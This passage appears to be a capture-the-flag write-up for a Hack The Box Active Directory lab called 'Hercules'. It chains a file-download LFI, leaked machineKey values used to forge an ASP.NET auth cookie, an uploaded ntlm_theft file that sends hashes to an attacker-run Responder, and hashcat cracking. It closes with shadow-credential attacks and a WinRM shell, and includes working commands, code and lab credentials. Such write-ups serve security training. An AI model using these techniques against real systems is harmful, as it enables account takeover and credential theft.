+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\admin:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED </code></pre><p>I have compromised <code>ken.w</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ken.w:change*th1s_p@ssw()rd!!</code></pre><h2>Domain Enumeration as <code>ken.w</code></h2><h3>Password policy</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u ken.w -p &#39;change*th1s_p@ssw()rd!!&#39; -k --pass-pol                         
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
+SMB         dc.hercules.htb 445    dc               [+] Dumping password info for domain: HERCULES
+SMB         dc.hercules.htb 445    dc               Minimum password length: 7
+SMB         dc.hercules.htb 445    dc               Password history length: None
+SMB         dc.hercules.htb 445    dc               Maximum password age: 
+SMB         dc.hercules.htb 445    dc               
+SMB         dc.hercules.htb 445    dc               Password Complexity Flags: 000001
+SMB         dc.hercules.htb 445    dc                   Domain Refuse Password Change: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password Store Cleartext: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password Lockout Admins: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password No Clear Change: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password No Anon Change: 0
+SMB         dc.hercules.htb 445    dc                   Domain Password Complex: 1
+SMB         dc.hercules.htb 445    dc               
+SMB         dc.hercules.htb 445    dc               Minimum password age: None
+SMB         dc.hercules.htb 445    dc               Reset Account Lockout Counter: 10 minutes 
+SMB         dc.hercules.htb 445    dc               Locked Account Duration: 10 minutes 
+SMB         dc.hercules.htb 445    dc               Account Lockout Threshold: None
+SMB         dc.hercules.htb 445    dc               Forced Log off Time: Not Set</code></pre><p>There is no lockout policy!</p><h3>Shares</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u ken.w -p &#39;change*th1s_p@ssw()rd!!&#39; -k --shares  
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!! 
+SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
+SMB         dc.hercules.htb 445    dc               Share           Permissions     Remark
+SMB         dc.hercules.htb 445    dc               -----           -----------     ------
+SMB         dc.hercules.htb 445    dc               ADMIN$                          Remote Admin
+SMB         dc.hercules.htb 445    dc               C$                              Default share
+SMB         dc.hercules.htb 445    dc               Department                      
+SMB         dc.hercules.htb 445    dc               IPC$            READ            Remote IPC
+SMB         dc.hercules.htb 445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Reports                         
+SMB         dc.hercules.htb 445    dc               SYSVOL          READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Users           READ</code></pre><p>Read access on the Users share</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u ken.w -p &#39;change*th1s_p@ssw()rd!!&#39; -k --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+jessica.e
+mikayla.a
+stephanie.w
+johanna.f
+heather.s
+camilla.b
+iis_administrator
+taylor.m
+fernando.r
+james.s
+anthony.r
+iis_webserver$
+iis_hadesapppool$
+iis_apppoolidentity$
+iis_defaultapppool$
+auditor
+vincent.g
+nate.h
+stephen.m
+mark.s
+elijah.m
+angelo.o
+ashley.b
+clarissa.c
+winda.s
+rene.s
+will.s
+zeke.s
+adriana.i
+tish.c
+jennifer.a
+shae.j
+joel.c
+jacob.b
+web_admin
+bob.w
+ken.w
+johnathan.j
+harris.d
+ray.n
+natalie.a
+ramona.l
+fiona.c
+patrick.s
+tanya.r
+WINSRV01-2016$
+WINSRV02-2016$
+WINSRV03-2016$
+ENTERPRISE01-8.1$
+ENTERPRISE02-8.1$
+Admin</code></pre><p>I will now dump all the users in the domain!</p><p>There are also no more passwords stored in account descriptions!</p><p>Also no password reuse</p><p>There are no GPP passwords</p><p>No kerberoastable or asreproastable users</p><p>Nothing interesting in bloodhound at the moment</p><h2>Access to the hercules web portal</h2><p>The credentials found will also help me get access to the web portal</p><p><img src="images/hercules/pasted-image-20260914181340.webp" alt="Screenshot" loading="lazy" /></p><p>The credentials also get me access to the web portal</p><p><img src="images/hercules/pasted-image-20260914181557.webp" alt="Screenshot" loading="lazy" /></p><p>An interesting message in the mail section</p><p><img src="images/hercules/pasted-image-20260914181632.webp" alt="Screenshot" loading="lazy" /></p><p>Also another potentially interesting endpoint</p><p><img src="images/hercules/pasted-image-20260914181800.webp" alt="Screenshot" loading="lazy" /></p><p>In the downloads section it gives the option to download files, when i do this i get this request in my proxy HTTP history, could be vulnerable to LFI</p><p>Ill move this request to replay in caido to try and get LFI</p><h2>LFI in hercules web portal file download</h2><p><img src="images/hercules/pasted-image-20260914182723.webp" alt="Screenshot" loading="lazy" /></p><p>I have confirmed LFI</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">    &lt;system.web&gt;
+        &lt;compilation targetFramework=&quot;4.8&quot; /&gt;
+        &lt;authentication mode=&quot;Forms&quot;&gt;
+            &lt;forms protection=&quot;All&quot; loginUrl=&quot;/Login&quot; path=&quot;/&quot; /&gt;
+        &lt;/authentication&gt;
+        &lt;httpRuntime enableVersionHeader=&quot;false&quot; maxRequestLength=&quot;2048&quot; executionTimeout=&quot;3600&quot; /&gt;
+        &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot; validation=&quot;HMACSHA256&quot; validationKey=&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot; /&gt;
+        &lt;customErrors mode=&quot;Off&quot; /&gt;
+    &lt;/system.web&gt;</code></pre><p>This is the <code>web.config</code> file, i think i can use this to forge another session for any user</p><h2>Session forging leads to access to web portal as <code>web_admin</code></h2><p>Ill create a console app (.NET framework) project in visual studio</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;
+&lt;configuration&gt;
+	&lt;system.web&gt;
+		&lt;machineKey
+		  validationKey=&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;
+		  decryptionKey=&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;
+		  validation=&quot;HMACSHA256&quot;
+		  decryption=&quot;AES&quot;
+		  compatibilityMode=&quot;Framework20SP2&quot; /&gt;
+	&lt;/system.web&gt;
+	&lt;startup&gt;
+		&lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.7.2&quot; /&gt;
+	&lt;/startup&gt;
+&lt;/configuration&gt;</code></pre><p>Ill set this as the following value in <code>app.config</code></p><p>Ill also make sure to use <code>System.Configuration</code> and <code>System.Web</code> as my assemblies</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">using System;
+using System.Web.Security;
+
+class Program
+{
+    static void Main()
+    {
+        // Self-test: encrypt then decrypt with YOUR key/config
+        var testTicket = new FormsAuthenticationTicket(
+            1, &quot;testuser&quot;, DateTime.Now, DateTime.Now.AddMinutes(30),
+            false, &quot;testuserdata&quot;
+        );
+        string encrypted = FormsAuthentication.Encrypt(testTicket);
+        Console.WriteLine(&quot;Self-encrypted: &quot; + encrypted);
+
+        try
+        {
+            var decrypted = FormsAuthentication.Decrypt(encrypted);
+            Console.WriteLine(&quot;=== Self round-trip SUCCESS ===&quot;);
+            Console.WriteLine(&quot;Name: &quot; + decrypted.Name);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(&quot;Self round-trip FAILED: &quot; + ex.Message);
+        }
+
+        Console.WriteLine();
+
+        // Now try the real target cookie
+        string targetCookie = &quot;02F10C26E9C2A046EC8EAB0E8801C42EE962FFD8DC256D3E89B8584FB2382D7F50348ECC50DA297DC4C099F715EB595954FBED677C2AA269BD611F083DBCE41F5BA78FBEA739DE2BC2DD16786B4A95777619C42AC9C4A656DF4FB421B77236D65286EE2C86FC01867BCC13081EB1732FB1E3DF3B34C8D3DB5491C13437F6312E75F7044181BC52A4365E0A6FF407BDB41E23275EF9E26EB826A2169D341E3AF8&quot;;
+        try
+        {
+            var ticket = FormsAuthentication.Decrypt(targetCookie);
+            Console.WriteLine(&quot;=== Target Decrypt SUCCESS ===&quot;);
+            Console.WriteLine(&quot;Name: &quot; + ticket.Name);
+            Console.WriteLine(&quot;UserData: &quot; + ticket.UserData);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(&quot;Target Decrypt FAILED: &quot; + ex.Message);
+        }
+
+        Console.ReadLine();
+    }
+}</code></pre><p>Ill then use this code and use the <code>Start</code> function in visual studio to run it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Self-encrypted: 07D5A2D3EF9058FEB518667E7E0BCF76CB13C8364C07BF00BDE3F65195FE5D52E63C07646901FA4C181B2EC06F28C8E148F43445C62439617A1CBD97543A4F36348A2F0387E5073BE5C0D3EE06AC45A90A5BE3F45D25B4BEF40E47649A23933274DECC537AA17D3E8C80496ECBF3D17672375FFC1F23BEEB9A042EB67BBF4A82441673AEB61F0B29763D90B6B6A67229837F58F7638C001386797D5B965CABF8819678E56609E2DEA542EC194633E2E5
+=== Self round-trip SUCCESS ===
+Name: testuser
+
+=== Target Decrypt SUCCESS ===
+Name: ken.w
+UserData: Web Users</code></pre><p>I managed to decrypt the session, now i can use these values to make my own for the <code>web_admin</code> user</p><p>Since <code>ken.w</code> is a web user, i want to use <code>web_admin</code> so ill have to get his group membership</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -u ken.w -p &#39;change*th1s_p@ssw()rd!!&#39; -k get object web_admin
+
+distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+accountExpires: 9999-12-31 23:59:59.999999+00:00
+badPasswordTime: 1601-01-01 00:00:00+00:00
+badPwdCount: 0
+cn: web_admin
+codePage: 0
+countryCode: 0
+dSCorePropagationData: 2024-12-04 01:45:07+00:00
+department: Web Administrators
+displayName: web_admin
+givenName: web_admin
+
+...[SNIP]...</code></pre><p>This user is part of the <code>Web Administrators</code></p><p>Now keeping all the structure the same ill just replace the code in program.cs to forge a session</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">using System;
+using System.Web.Security;
+
+class Program
+{
+    static void Main()
+    {
+        var forgedTicket = new FormsAuthenticationTicket(
+            1,
+            &quot;web_admin&quot;,
+            DateTime.Now,
+            DateTime.Now.AddHours(2),
+            true,
+            &quot;Web Administrators&quot;
+        );
+
+        string forgedCookie = FormsAuthentication.Encrypt(forgedTicket);
+        Console.WriteLine(&quot;Forged cookie: &quot; + forgedCookie);
+
+        Console.ReadLine();
+    }
+}</code></pre><p>This is the code used in program.cs</p><p>Ill run this using start again</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">Forged cookie: 970E3754D7F736FE33DC8F535CF866E91E252A372CCEA24592840F5FDCCFAE2B4664799B6D20BEA1176F43328094D1B06615E0F3D502744771F1F48D52845C73B4975C526210B2B412CE697FCB1195384EF269A1F6135ECB7CE0165C5B88BA9FDE390B62015688604C3B83CE92A35C1D595C28CB762E1AEB8BCF786496C4343EEA9494F63B84DD092B6F13B7B7F2BC8B09291A109AD3776BCF91B3BF7FBCB7B1412484F9527021D417EBA16090B1D733AF0251CDED4C3869D103BC121A9F0FCB</code></pre><p>I now have a forged session</p><p>And after replacing my old <code>.ASPXAUTH</code> value with the new and refreshing</p><p><img src="images/hercules/pasted-image-20260915202119.webp" alt="Screenshot" loading="lazy" /></p><p>I now have access as the web_admin</p><h2>Enumeration of web portal as <code>web_admin</code></h2><p><img src="images/hercules/pasted-image-20260915202426.webp" alt="Screenshot" loading="lazy" /></p><p><img src="images/hercules/pasted-image-20260915202559.webp" alt="Screenshot" loading="lazy" /></p><p>Maybe a hint towards a file upload?</p><p>Ill try upload a .txt file and see what it says</p><p><img src="images/hercules/pasted-image-20260915203124.webp" alt="Screenshot" loading="lazy" /></p><p>It doesnt allow .txt</p><p>But now i can use the request from my proxy HTTP history to try and figure out what file type it does allow</p><h2>Hash capture via malicious ODT file upload</h2><p>After trying several file types i see it accepts .odt</p><p><img src="images/hercules/pasted-image-20260915203357.webp" alt="Screenshot" loading="lazy" /></p><p>I can use ntlm_theft to generate this, then spin up responder to catch a hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>First ill start responder</p><p><a href="https://github.com/Greenwolf/ntlm_theft" target="_blank" rel="noreferrer">https://github.com/Greenwolf/ntlm_theft</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 ntlm_theft.py -g all -s 10.10.14.61 -f meeting  
+Created: meeting/meeting.scf (BROWSE TO FOLDER)
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Created: meeting/Autorun.inf (BROWSE TO FOLDER)
+Created: meeting/desktop.ini (BROWSE TO FOLDER)
+Created: meeting/meeting.theme (THEME TO INSTALL)
+Created: meeting/meeting.bat (BROWSE TO FOLDER)
+Generation Complete.</code></pre><p>Then ill generate the file</p><p>Then i can upload it</p><p><img src="images/hercules/pasted-image-20260915203751.webp" alt="Screenshot" loading="lazy" /></p><p>Then ill submit the request</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">
+[SMB] NTLMv2-SSP Client   : 10.129.242.196
+[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
+[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:9069fe9ed423f5c4:B789639B8C1666AECB7299FE40D5E419:010100000000000000E865BE5145DD01C0F592B80802FB5E00000000020008004C0047003100510001001E00570049004E002D003100560045004C004F0036003900410056005600490004003400570049004E002D003100560045004C004F003600390041005600560049002E004C004700310051002E004C004F00430041004C00030014004C004700310051002E004C004F00430041004C00050014004C004700310051002E004C004F00430041004C000700080000E865BE5145DD01060004000200000008003000300000000000000000000000002000000E27DE7B628ABC0E8CF9320EE1F1672CE3599D2723006D06A21B66F0F08BDA920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360031000000000000000000</code></pre><p>I managed to catch a hash!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat &#39;natalie.a::HERCULES:9069fe9ed423f5c4:B789639B8C1666AECB7299FE40D5E419:010100000000000000E865BE5145DD01C0F592B80802FB5E00000000020008004C0047003100510001001E00570049004E002D003100560045004C004F0036003900410056005600490004003400570049004E002D003100560045004C004F003600390041005600560049002E004C004700310051002E004C004F00430041004C00030014004C004700310051002E004C004F00430041004C00050014004C004700310051002E004C004F00430041004C000700080000E865BE5145DD01060004000200000008003000300000000000000000000000002000000E27DE7B628ABC0E8CF9320EE1F1672CE3599D2723006D06A21B66F0F08BDA920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360031000000000000000000&#39; /usr/share/wordlists/rockyou.txt
+
+NATALIE.A::HERCULES:9069fe9ed423f5c4:b789639b8c1666aecb7299fe40d5e419:010100000000000000e865be5145dd01c0f592b80802fb5e00000000020008004c0047003100510001001e00570049004e002d003100560045004c004f0036003900410056005600490004003400570049004e002d003100560045004c004f003600390041005600560049002e004c004700310051002e004c004f00430041004c00030014004c004700310051002e004c004f00430041004c00050014004c004700310051002e004c004f00430041004c000700080000e865be5145dd01060004000200000008003000300000000000000000000000002000000e27de7b628abc0e8cf9320ee1f1672ce3599d2723006d06a21b66f0f08bda920a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00360031000000000000000000:Prettyprincess123!</code></pre><p>It cracked!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u natalie.a -p &#39;Prettyprincess123!&#39; -k                           
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:Prettyprincess123!</code></pre><p>This user is now compromised</p><h2>Domain Enumeration as <code>natalie.a</code></h2><p><img src="images/hercules/pasted-image-20260915204528.webp" alt="Screenshot" loading="lazy" /></p><p>This user has GenericWrite over 6 users</p><p><code>bob.w</code> and the <code>web_admin</code> are most interesting since both are part of more groups</p><p><img src="images/hercules/pasted-image-20260915204641.webp" alt="Screenshot" loading="lazy" /></p><p>The web admin also is part of the same groups apart from recruitment managers</p><h2>Compromising <code>bob.w</code> via shadow credentials</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad shadow auto -u &#39;natalie.a@hercules.htb&#39; -p &#39;Prettyprincess123!&#39; -account &#39;bob.w&#39; -dc-host dc.hercules.htb -dc-ip 10.129.242.196 -ldap-scheme ldap -k
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Targeting user &#39;bob.w&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;e6bb72108e6842969fe1f1f38cd17dfa&#39;
+[*] Adding Key Credential with device ID &#39;e6bb72108e6842969fe1f1f38cd17dfa&#39; to the Key Credentials for &#39;bob.w&#39;
+[*] Successfully added Key Credential with device ID &#39;e6bb72108e6842969fe1f1f38cd17dfa&#39; to the Key Credentials for &#39;bob.w&#39;
+[*] Authenticating as &#39;bob.w&#39; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &#39;bob.w@hercules.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;bob.w.ccache&#39;
+[*] Wrote credential cache to &#39;bob.w.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;bob.w&#39;
+[*] Restoring the old Key Credentials for &#39;bob.w&#39;
+[*] Successfully restored the old Key Credentials for &#39;bob.w&#39;
+[*] NT hash for &#39;bob.w&#39;: 8a65c74e8f0073babbfac6725c66cc3f</code></pre><p>I now have an NT hash for this user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u bob.w -H &#39;8a65c74e8f0073babbfac6725c66cc3f&#39; -k
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\bob.w:8a65c74e8f0073babbfac6725c66cc3f</code></pre><p>This user is now compromised!</p><h2>Access on shares as <code>bob.w</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc.hercules.htb -u bob.w -H &#39;8a65c74e8f0073babbfac6725c66cc3f&#39; -k --shares
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\bob.w:8a65c74e8f0073babbfac6725c66cc3f 
+SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
+SMB         dc.hercules.htb 445    dc               Share           Permissions     Remark
+SMB         dc.hercules.htb 445    dc               -----           -----------     ------
+SMB         dc.hercules.htb 445    dc               ADMIN$                          Remote Admin
+SMB         dc.hercules.htb 445    dc               C$                              Default share
+SMB         dc.hercules.htb 445    dc               Department      READ            
+SMB         dc.hercules.htb 445    dc               IPC$            READ            Remote IPC
+SMB         dc.hercules.htb 445    dc               NETLOGON        READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Reports         READ            
+SMB         dc.hercules.htb 445    dc               SYSVOL          READ            Logon server share 
+SMB         dc.hercules.htb 445    dc               Users           READ</code></pre><p>I now have more access on SMB shares</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient.py hercules.htb/bob.w@dc.hercules.htb -hashes &#39;:8a65c74e8f0073babbfac6725c66cc3f&#39; -k -no-pass
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+Type help for list of commands
+# shares
+Share Name                Type            Comment
+----------------------------------------------------------------------
+ADMIN$                    DISK (SPECIAL)  Remote Admin
+C$                        DISK (SPECIAL)  Default share
+Department                DISK            
+IPC$                      IPC (SPECIAL)   Remote IPC
+NETLOGON                  DISK            Logon server share 
+Reports                   DISK            
+SYSVOL                    DISK            Logon server share 
+Users                     DISK            
+# use Department
+# ls
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 .
+drw-rw-rw-          0  Wed Dec  4 01:45:11 2024 ..
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Engineering Department
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 IT
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Recruitment
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Security Department
+drw-rw-rw-          0  Wed Dec  4 01:45:12 2024 Web Department
+# use Reports
+# ls
+drw-rw-rw-          0  Tue Sep 15 20:39:28 2026 .
+drw-rw-rw-          0  Thu Oct  9 15:56:58 2025 ..
+-rw-rw-rw-         97  Tue Sep 15 20:39:05 2026 .~lock.a9987c8f-6986-4211-a8f2-0e4c2096a0d1.odt#
+-rw-rw-rw-         97  Tue Sep 15 20:33:14 2026 .~lock.da81e5c9-f25e-46e0-94cd-e4567d87c6af.odt#
+# </code></pre><p>The Department share has a <code>.lnk</code> file and a email</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat notice.eml  
+--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
+Content-Type: multipart/alternative;
+	boundary=&quot;_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_&quot;
+
+--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
+Content-Type: text/plain; charset=&quot;us-ascii&quot;
+Content-Transfer-Encoding: quoted-printable
+________________________________
+From: Ashley Browne
+Sent: Tuesday 10:17:27 AM
+To: IT Support &lt;HERCULES\IT Support@HERCULES.HTB&gt;
+Subject: Password Reset
+
+Hey Team,
+
+The Administration has provided a solution to much of the permission issues=
+some of you have been facing.
+
+If you are having problems changing a password, the instructions are:
+
+1) Check AD Permissions against the user.
+2) Run the shortcut provided in the share.
+3) Try to reset the password again.
+
+If all else fails, send me a message.
+
+Regards, Ashley.
+
+--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
+Content-Type: text/html; charset=&quot;us-ascii&quot;
+Content-Transfer-Encoding: quoted-printable</code></pre><p>This is the email, that references the .lnk</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">C:\Users\ashley.b\Desktop\aCleanup.ps1</code></pre><p>And after use cat to check the output of the .lnk i see its executing a powershell script in <code>ashley.b</code> desktop</p><p>There is also a Users share, but checking ashely.b desktop i did not find the powershell script</p><p>But checking ashley.b on bloodhound shows she has ForceChangePassword on a lot of users so the script likely uses her permissions to change the passwords</p><p>I dont think i can do anything with this for now since i dont have access to the script or ashley</p><h2>Writable objects as <code>bob.w</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc.hercules.htb -d hercules.htb -k get writable 
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+
+distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE
+
+distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+permission: CREATE_CHILD; WRITE</code></pre><p>This user has WRITE on three OUs and of course its child objects, which includes quite a few users</p><h2>Moving <code>Auditor</code> to the <code>Web Department</code> OU to inherit GenericWrite</h2><p>And after returning to the user <code>natalie.a</code>, she had GenericWrite on the web department OU, so i should be able to move users as <code>bob.w</code> to the web department OU so that <code>natalie.a</code> gets GenericWrite on them</p><p>Ill target the <code>Auditor</code> account since they have access over WINRM and is part of the Security department OU</p><p>To do this ill use my tool i created</p><p><a href="https://github.com/ethanbauer10/OU-move" target="_blank" rel="noreferrer">https://github.com/ethanbauer10/OU-move</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 ou-move.py -H ldap://dc.hercules.htb --kerberos --from-ou &quot;CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb&quot; --to-ou &quot;OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb&quot;
+
+  ___  _   _   __  __                   
+ / _ \| | | | |  \/  |                  
+| | | | | | | | |\/| | _____   _____    
+| |_| | |_| | | |  | |/ _ \ \ / / _ \  
+ \___/ \___/  |_|  |_|\___/\ V /  __/  
+                              \_/ \___|  
+  OU Move Tool — LDAP moddn
+
+[*] Connecting to dc.hercules.htb:389 (LDAP)
+[*] Binding via Kerberos (SASL GSSAPI) using existing ticket cache...
+[+] Bound via Kerberos as: u:HERCULES\bob.w
+
+[*] Verifying object exists: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+[+] Object confirmed.
+
+[*] Source DN   : CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+[*] New RDN     : CN=Auditor
+[*] New superior: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+
+[*] Executing moddn...
+[+] Success! Object moved.
+[+] New DN: CN=Auditor,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb</code></pre><p>I have had to add kerberos auth to my tool, so that may appear on GH soon.</p><p>But this user should now be in the new OU</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad shadow auto -u &#39;natalie.a@hercules.htb&#39; -p &#39;Prettyprincess123!&#39; -account &#39;Auditor&#39; -dc-host dc.hercules.htb -dc-ip 10.129.242.196 -k -target dc.hercules.htb
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
+[*] Targeting user &#39;auditor&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;2eef6fc9f6b74521861ab86896dd8a1d&#39;
+[*] Adding Key Credential with device ID &#39;2eef6fc9f6b74521861ab86896dd8a1d&#39; to the Key Credentials for &#39;auditor&#39;
+[*] Successfully added Key Credential with device ID &#39;2eef6fc9f6b74521861ab86896dd8a1d&#39; to the Key Credentials for &#39;auditor&#39;
+[*] Authenticating as &#39;auditor&#39; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &#39;auditor@hercules.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;auditor.ccache&#39;
+[*] Wrote credential cache to &#39;auditor.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;auditor&#39;
+[*] Restoring the old Key Credentials for &#39;auditor&#39;
+[*] Successfully restored the old Key Credentials for &#39;auditor&#39;
+[*] NT hash for &#39;auditor&#39;: a9285c625af80519ad784729655ff325</code></pre><p>Then ill get the NT hash for the user</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.hercules.htb -r hercules.htb -u Auditor -S
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
